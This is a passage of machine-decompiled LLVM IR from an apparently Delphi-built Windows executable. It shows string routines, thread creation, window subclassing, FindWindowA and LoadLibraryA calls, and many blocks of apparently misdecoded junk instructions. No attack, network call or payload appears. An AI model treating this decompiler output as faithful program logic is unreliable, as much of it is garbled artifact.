  %104 = add i32 %esp.0.reload, -92, !insn.addr !1535
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1535
  store i32 %106, i32* %105, align 4, !insn.addr !1535
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1536
  %108 = call i32 @function_4060f0(), !insn.addr !1537
  %109 = call i32 @"@LStrPos"(), !insn.addr !1538
  %110 = add i32 %109, -1, !insn.addr !1539
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1540
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1540
  store i32 %110, i32* %112, align 4, !insn.addr !1540
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1541
  %114 = call i32 @function_4060f0(), !insn.addr !1542
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1543
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1544
  store i32 %116, i32* %112, align 4, !insn.addr !1545
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1546
  %118 = call i32 @function_4060f0(), !insn.addr !1547
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1548
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1548
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1549
  %122 = call i32 @function_4060f0(), !insn.addr !1550
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1551
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1552
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1552
  br label %dec_label_pc_4065d1, !insn.addr !1552

dec_label_pc_406509:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1553
  %125 = icmp slt i32 %124, 5, !insn.addr !1554
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1554
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1554
  br i1 %125, label %dec_label_pc_4065d1, label %dec_label_pc_40651a, !insn.addr !1554

dec_label_pc_40651a:                              ; preds = %dec_label_pc_406509
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1555
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1555
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %127, align 4, !insn.addr !1555
  %128 = call i32 @function_404b20(), !insn.addr !1556
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1557
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1557
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1558
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1558
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %132, align 4, !insn.addr !1558
  %133 = call i32 @function_404b20(), !insn.addr !1559
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1560
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1561
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1562
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1562
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1563
  %140 = call i32 @function_4060f0(), !insn.addr !1564
  %141 = call i32 @function_404c78(), !insn.addr !1565
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1566
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1566
  br label %dec_label_pc_4065d1, !insn.addr !1566

dec_label_pc_406577:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1567
  %143 = icmp slt i32 %142, 5, !insn.addr !1568
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1568
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1568
  br i1 %143, label %dec_label_pc_4065d1, label %dec_label_pc_406584, !insn.addr !1568

dec_label_pc_406584:                              ; preds = %dec_label_pc_406577
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1569
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1569
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %145, align 4, !insn.addr !1569
  %146 = call i32 @function_404b20(), !insn.addr !1570
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1571
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1571
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1572
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1572
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %150, align 4, !insn.addr !1572
  %151 = call i32 @function_404b20(), !insn.addr !1573
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1574
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1575
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1576
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1576
  %157 = call i32 @function_4060f0(), !insn.addr !1577
  %158 = call i32 @function_404c78(), !insn.addr !1578
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1578
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1578
  br label %dec_label_pc_4065d1, !insn.addr !1578

dec_label_pc_4065d1:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406584, %dec_label_pc_406577, %dec_label_pc_40651a, %dec_label_pc_406509, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1579
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1579
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1580
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1581
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1582
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1582
  store i32 4220403, i32* %163, align 4, !insn.addr !1582
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1583
  ret i32 %164, !insn.addr !1584
}

define i32 @function_4065ec() local_unnamed_addr {
dec_label_pc_4065ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1585
  ret i32 %0, !insn.addr !1585
}

define i32 @function_4065f1() local_unnamed_addr {
dec_label_pc_4065f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1586
}

define i32 @function_4065f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1587
}

define i32 @function_40661f() local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1588
}

define i32 @function_406627() local_unnamed_addr {
dec_label_pc_406627:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1589
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1589
  store i32 %1, i32* %2, align 4, !insn.addr !1589
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1590
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1590
  %7 = add i8 %4, %6, !insn.addr !1590
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1590
  store i8 %7, i8* %8, align 1, !insn.addr !1590
  %9 = load i8, i8* %3, align 4, !insn.addr !1591
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1591
  %12 = trunc i32 %11 to i8, !insn.addr !1591
  %13 = add i8 %9, %12, !insn.addr !1591
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1591
  store i8 %13, i8* %14, align 1, !insn.addr !1591
  %15 = load i32, i32* %eax, align 4, !insn.addr !1592
  ret i32 %15, !insn.addr !1592
}

define i32 @function_40662e() local_unnamed_addr {
dec_label_pc_40662e:
  %0 = call i32 @function_40666c(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1593
  ret i32 %0, !insn.addr !1593
}

define i32 @function_40666a() local_unnamed_addr {
dec_label_pc_40666a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1594
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1594
  store i8 %2, i8* %3, align 1, !insn.addr !1594
  ret i32 %0, !insn.addr !1594
}

define i32 @function_40666c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40666c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_4066d0, label %dec_label_pc_40666f, !insn.addr !1595

dec_label_pc_40666f:                              ; preds = %dec_label_pc_40666c
  %5 = icmp eq i1 %4, false, !insn.addr !1596
  br i1 %5, label %dec_label_pc_4066e4, label %dec_label_pc_406671, !insn.addr !1596

dec_label_pc_406671:                              ; preds = %dec_label_pc_40666f
  ret i32 %2, !insn.addr !1597

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40666c
  %6 = call i32 @function_4045ac(), !insn.addr !1598
  br label %dec_label_pc_4066e4, !insn.addr !1599

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066d0, %dec_label_pc_40666f
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1600
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 4219720, i32 (i32*)* null, i32* null, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1601
  %9 = add i32 %0, 20, !insn.addr !1602
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1602
  %11 = load i32, i32* %10, align 4, !insn.addr !1602
  %12 = add i32 %0, 16, !insn.addr !1603
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1603
  %14 = load i32, i32* %13, align 4, !insn.addr !1603
  %15 = add i32 %0, 8, !insn.addr !1604
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1604
  %17 = load i32, i32* %16, align 4, !insn.addr !1604
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1605
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1605
  ret i32 %19, !insn.addr !1606
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1607
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1607
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220576 to i32*), i32 -4, i32 %3), !insn.addr !1608
  ret i32 %4, !insn.addr !1609
}

define i32 @function_406751(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406751:
  %merge7.reg2mem = alloca i32, !insn.addr !1610
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1610
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1610
  store i8 %3, i8* %4, align 1, !insn.addr !1610
  %5 = add i32 %1, 114, !insn.addr !1611
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1611
  %7 = load i8, i8* %6, align 1, !insn.addr !1611
  %8 = udiv i32 %0, 256, !insn.addr !1611
  %9 = trunc i32 %8 to i8, !insn.addr !1611
  %10 = add i8 %7, %9, !insn.addr !1611
  store i8 %10, i8* %6, align 1, !insn.addr !1611
  %11 = add i8 %2, -32, !insn.addr !1612
  %12 = icmp ult i8 %2, 32, !insn.addr !1612
  %13 = icmp eq i8 %11, 0, !insn.addr !1612
  %14 = zext i8 %11 to i32, !insn.addr !1612
  %15 = and i32 %1, -256, !insn.addr !1612
  %16 = or i32 %15, %14, !insn.addr !1612
  %17 = or i1 %12, %13, !insn.addr !1613
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1613
  br i1 %17, label %dec_label_pc_40675a, label %dec_label_pc_4067ab, !insn.addr !1613

dec_label_pc_40675a:                              ; preds = %dec_label_pc_406751
  %18 = add i32 %16, 105, !insn.addr !1614
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1614
  %20 = load i8, i8* %19, align 1, !insn.addr !1614
  %21 = and i8 %20, %9, !insn.addr !1614
  store i8 %21, i8* %19, align 1, !insn.addr !1614
  %22 = trunc i32 %arg3 to i16, !insn.addr !1615
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1615
  %24 = load i8, i8* %23, align 1, !insn.addr !1615
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1615
  %25 = add i32 %arg5, 105, !insn.addr !1616
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1616
  %28 = load i8, i8* %27, align 1, !insn.addr !1616
  %29 = udiv i32 %arg2, 256, !insn.addr !1616
  %30 = trunc i32 %29 to i8, !insn.addr !1616
  %31 = and i8 %28, %30, !insn.addr !1616
  store i8 %31, i8* %27, align 1, !insn.addr !1616
  %32 = mul i32 %arg5, 2, !insn.addr !1617
  %33 = add i32 %arg2, 115, !insn.addr !1617
  %34 = add i32 %33, %32, !insn.addr !1617
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1617
  %36 = load i8, i8* %35, align 1, !insn.addr !1617
  %37 = trunc i32 %arg2 to i8, !insn.addr !1617
  %38 = add i8 %36, %37, !insn.addr !1617
  %39 = icmp eq i8 %38, 0, !insn.addr !1617
  store i8 %38, i8* %35, align 1, !insn.addr !1617
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1618
  br i1 %39, label %dec_label_pc_4067ab, label %dec_label_pc_406769, !insn.addr !1618

dec_label_pc_406769:                              ; preds = %dec_label_pc_40675a
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1619
  %41 = load i32, i32* %40, align 4, !insn.addr !1619
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1619
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1620
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1620
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1620
  %45 = icmp eq i32* %43, null, !insn.addr !1621
  %46 = icmp eq i1 %45, false, !insn.addr !1622
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1622
  br i1 %46, label %dec_label_pc_4067ab, label %dec_label_pc_40678d, !insn.addr !1622

dec_label_pc_40678d:                              ; preds = %dec_label_pc_406769
  %47 = call i32 @function_40671c(), !insn.addr !1623
  %48 = call i32 @function_4036c8(), !insn.addr !1624
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1625
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1626
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1626
  ret i32 %51, !insn.addr !1627

dec_label_pc_4067ab:                              ; preds = %dec_label_pc_406751, %dec_label_pc_406769, %dec_label_pc_40675a
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1628
}

define i32 @function_406871(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406871:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1629
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1629
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1629
  %9 = add i8 %6, %8, !insn.addr !1629
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1629
  store i8 %9, i8* %10, align 1, !insn.addr !1629
  %11 = load i32, i32* %eax, align 4, !insn.addr !1630
  %12 = add i32 %11, 114, !insn.addr !1630
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1630
  %14 = load i8, i8* %13, align 1, !insn.addr !1630
  %15 = udiv i32 %2, 256, !insn.addr !1630
  %16 = trunc i32 %15 to i8, !insn.addr !1630
  %17 = add i8 %14, %16, !insn.addr !1630
  store i8 %17, i8* %13, align 1, !insn.addr !1630
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1631
  %20 = add i8 %19, -32, !insn.addr !1631
  %21 = icmp ult i8 %19, 32, !insn.addr !1631
  %22 = icmp eq i8 %20, 0, !insn.addr !1631
  %23 = zext i8 %20 to i32, !insn.addr !1631
  %24 = and i32 %18, -256, !insn.addr !1631
  %25 = or i32 %24, %23, !insn.addr !1631
  store i32 %25, i32* %eax, align 4, !insn.addr !1631
  %26 = or i1 %21, %22, !insn.addr !1632
  br i1 %26, label %dec_label_pc_40687a, label %dec_label_pc_4068e9, !insn.addr !1632

dec_label_pc_40687a:                              ; preds = %dec_label_pc_406871
  %27 = add i32 %25, 105, !insn.addr !1633
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1633
  %29 = load i8, i8* %28, align 1, !insn.addr !1633
  %30 = and i8 %29, %16, !insn.addr !1633
  store i8 %30, i8* %28, align 1, !insn.addr !1633
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1634
  store i32 %31, i32* %eax, align 4, !insn.addr !1634
  %32 = trunc i32 %arg3 to i16, !insn.addr !1635
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1635
  %34 = load i8, i8* %33, align 1, !insn.addr !1635
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1635
  %35 = add i32 %arg5, 105, !insn.addr !1636
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1636
  %38 = load i8, i8* %37, align 1, !insn.addr !1636
  %39 = udiv i32 %arg2, 256, !insn.addr !1636
  %40 = trunc i32 %39 to i8, !insn.addr !1636
  %41 = and i8 %38, %40, !insn.addr !1636
  store i8 %41, i8* %37, align 1, !insn.addr !1636
  %42 = mul i32 %arg5, 2, !insn.addr !1637
  %43 = add i32 %arg2, 115, !insn.addr !1637
  %44 = add i32 %43, %42, !insn.addr !1637
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1637
  %46 = load i8, i8* %45, align 1, !insn.addr !1637
  %47 = trunc i32 %arg2 to i8, !insn.addr !1637
  %48 = add i8 %46, %47, !insn.addr !1637
  %49 = icmp eq i8 %48, 0, !insn.addr !1637
  store i8 %48, i8* %45, align 1, !insn.addr !1637
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1638
  br i1 %49, label %dec_label_pc_4068cb, label %dec_label_pc_406889, !insn.addr !1638

dec_label_pc_406889:                              ; preds = %dec_label_pc_40687a
  %50 = icmp slt i8 %48, 0, !insn.addr !1637
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1639
  %52 = load i32, i32* %51, align 4, !insn.addr !1639
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1639
  br i1 %50, label %dec_label_pc_406900, label %dec_label_pc_40688e, !insn.addr !1640

dec_label_pc_40688e:                              ; preds = %dec_label_pc_406889
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1641
  %55 = add i8 %54, -32, !insn.addr !1641
  %56 = icmp ult i8 %54, 32, !insn.addr !1641
  %57 = icmp eq i8 %55, 0, !insn.addr !1641
  %58 = zext i8 %55 to i32, !insn.addr !1641
  %59 = and i32 %53, -256, !insn.addr !1641
  %60 = or i32 %59, %58, !insn.addr !1641
  store i32 %60, i32* %eax, align 4, !insn.addr !1641
  %61 = or i1 %56, %57, !insn.addr !1642
  br i1 %61, label %dec_label_pc_406892, label %dec_label_pc_406901, !insn.addr !1642

dec_label_pc_406892:                              ; preds = %dec_label_pc_40688e
  %62 = add i32 %arg2, 105, !insn.addr !1643
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1643
  %64 = load i8, i8* %63, align 1, !insn.addr !1643
  %65 = udiv i32 %53, 256, !insn.addr !1643
  %66 = trunc i32 %65 to i8, !insn.addr !1643
  %67 = and i8 %64, %66, !insn.addr !1643
  store i8 %67, i8* %63, align 1, !insn.addr !1643
  %68 = add i32 %arg6, 105, !insn.addr !1644
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1644
  %70 = load i8, i8* %69, align 1, !insn.addr !1644
  %71 = and i8 %70, %40, !insn.addr !1644
  store i8 %71, i8* %69, align 1, !insn.addr !1644
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1645
  %74 = load i8, i8* %73, align 1, !insn.addr !1645
  %75 = trunc i32 %72 to i8, !insn.addr !1645
  %76 = add i8 %74, %75, !insn.addr !1645
  store i8 %76, i8* %73, align 1, !insn.addr !1645
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1646
  %79 = load i8, i8* %78, align 1, !insn.addr !1646
  %80 = trunc i32 %77 to i8, !insn.addr !1646
  %81 = add i8 %79, %80, !insn.addr !1646
  store i8 %81, i8* %78, align 1, !insn.addr !1646
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1647
  %83 = load i32, i32* %82, align 4, !insn.addr !1647
  %84 = add i32 %83, %arg6, !insn.addr !1647
  store i32 %84, i32* %82, align 4, !insn.addr !1647
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1648
  %87 = load i8, i8* %86, align 1, !insn.addr !1648
  %88 = trunc i32 %85 to i8, !insn.addr !1648
  %89 = add i8 %87, %88, !insn.addr !1648
  store i8 %89, i8* %86, align 1, !insn.addr !1648
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1649
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1650
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1650
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1650
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1651
  %92 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1652
  %93 = add i32 %92, 1, !insn.addr !1652
  %94 = icmp eq i32 %93, 0, !insn.addr !1652
  store i32 %93, i32* @global_var_4096d4, align 4, !insn.addr !1652
  %95 = icmp eq i1 %94, false, !insn.addr !1653
  br i1 %95, label %dec_label_pc_4068c3, label %dec_label_pc_4068b9, !insn.addr !1653

dec_label_pc_4068b9:                              ; preds = %dec_label_pc_406892
  %96 = call i32 @"@LStrClr"(), !insn.addr !1654
  br label %dec_label_pc_4068c3, !insn.addr !1654

dec_label_pc_4068c3:                              ; preds = %dec_label_pc_4068b9, %dec_label_pc_406892
  store i32 0, i32* %eax, align 4, !insn.addr !1655
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1656
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1657
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1657
  br label %dec_label_pc_4068cb, !insn.addr !1657

dec_label_pc_4068cb:                              ; preds = %dec_label_pc_4068c3, %dec_label_pc_40687a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1658
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1658
  store i32 4221144, i32* %99, align 4, !insn.addr !1658
  %100 = load i32, i32* %eax, align 4, !insn.addr !1659
  ret i32 %100, !insn.addr !1659

dec_label_pc_4068e9:                              ; preds = %dec_label_pc_406871
  %101 = mul i32 %4, 2, !insn.addr !1660
  %102 = add i32 %1, 105, !insn.addr !1660
  %103 = add i32 %102, %101, !insn.addr !1660
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1660
  %105 = load i32, i32* %104, align 4, !insn.addr !1660
  %106 = or i32 %105, %3, !insn.addr !1660
  store i32 %106, i32* %104, align 4, !insn.addr !1660
  %107 = add i32 %0, -1, !insn.addr !1661
  %108 = trunc i32 %3 to i16, !insn.addr !1662
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1662
  %110 = load i32, i32* %109, align 4, !insn.addr !1662
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1662
  %111 = load i32, i32* %eax, align 4, !insn.addr !1663
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1663
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1663
  %115 = or i8 %112, %114, !insn.addr !1663
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1663
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1664
  %118 = load i8, i8* %117, align 1, !insn.addr !1664
  %119 = trunc i32 %116 to i8, !insn.addr !1664
  %120 = add i8 %118, %119, !insn.addr !1664
  store i8 %120, i8* %117, align 1, !insn.addr !1664
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1665
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1665
  %124 = load i8, i8* %123, align 1, !insn.addr !1665
  %125 = add i8 %124, %122, !insn.addr !1665
  %126 = zext i8 %125 to i32, !insn.addr !1665
  %127 = and i32 %121, -256, !insn.addr !1665
  %128 = or i32 %127, %126, !insn.addr !1665
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1666
  %130 = load i8, i8* %129, align 1, !insn.addr !1666
  %131 = trunc i32 %3 to i8, !insn.addr !1667
  %132 = add i8 %125, %131, !insn.addr !1666
  %133 = add i8 %132, %130, !insn.addr !1667
  store i8 %133, i8* %129, align 1, !insn.addr !1667
  %134 = add i32 %128, 1, !insn.addr !1668
  store i32 %134, i32* %eax, align 4, !insn.addr !1668
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1669
  %136 = load i8, i8* %135, align 1, !insn.addr !1669
  %137 = trunc i32 %134 to i8, !insn.addr !1669
  %138 = add i8 %136, %137, !insn.addr !1669
  store i8 %138, i8* %135, align 1, !insn.addr !1669
  br label %dec_label_pc_406900, !insn.addr !1669

dec_label_pc_406900:                              ; preds = %dec_label_pc_4068e9, %dec_label_pc_406889
  %139 = load i32, i32* %eax, align 4, !insn.addr !1669
  ret i32 %139, !insn.addr !1669

dec_label_pc_406901:                              ; preds = %dec_label_pc_40688e
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1670
  %141 = load i8, i8* %140, align 1, !insn.addr !1670
  %142 = add i8 %141, %55, !insn.addr !1670
  store i8 %142, i8* %140, align 1, !insn.addr !1670
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1671
  %145 = load i8, i8* %144, align 1, !insn.addr !1671
  %146 = trunc i32 %arg3 to i8, !insn.addr !1671
  %147 = add i8 %145, %146, !insn.addr !1671
  store i8 %147, i8* %144, align 1, !insn.addr !1671
  %148 = load i32, i32* %eax, align 4, !insn.addr !1672
  %149 = add i32 %148, 1, !insn.addr !1672
  %150 = mul i32 %149, 2, !insn.addr !1673
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1673
  %152 = load i8, i8* %151, align 2, !insn.addr !1673
  %153 = trunc i32 %149 to i8, !insn.addr !1673
  %154 = add i8 %152, %153, !insn.addr !1673
  store i8 %154, i8* %151, align 2, !insn.addr !1673
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1674
  %156 = load i8, i8* %155, align 1, !insn.addr !1674
  %157 = add i8 %156, %153, !insn.addr !1674
  store i8 %157, i8* %155, align 1, !insn.addr !1674
  ret i32 %149, !insn.addr !1675
}

define i32 @function_40691f() local_unnamed_addr {
dec_label_pc_40691f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1676
}

define i32 @function_40692c() local_unnamed_addr {
dec_label_pc_40692c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1677
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1678
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1678
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1678
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1679
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1680
  %3 = call i32 @function_4036c8(), !insn.addr !1681
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1682
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1682
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1682
